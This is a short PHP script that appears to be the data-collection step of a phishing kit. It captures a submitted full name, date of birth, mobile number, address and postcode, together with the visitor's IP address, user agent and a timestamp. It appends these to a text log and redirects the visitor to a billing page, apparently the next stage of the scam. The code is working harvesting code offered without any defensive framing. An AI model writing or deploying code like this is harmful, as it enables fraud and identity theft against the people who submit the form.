<?php

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$useragent = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a"); 
$PublicIP = get_client_ip();

file_put_contents("usernames.txt", 
"FullName: " . $_POST['fullname'] . "
DOB     : " . $_POST['dob'] . "
Mobile  : " . $_POST['mobile'] . "
Address : " . $_POST['address'] . "
PostCode: " . $_POST['postcode'] . "
User IP      : ".$PublicIP."
User Agent   : ".$useragent. "
Date & Time  : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
====================[END]==================== \n", FILE_APPEND);
header('Location: Billing.html');
exit();
?>
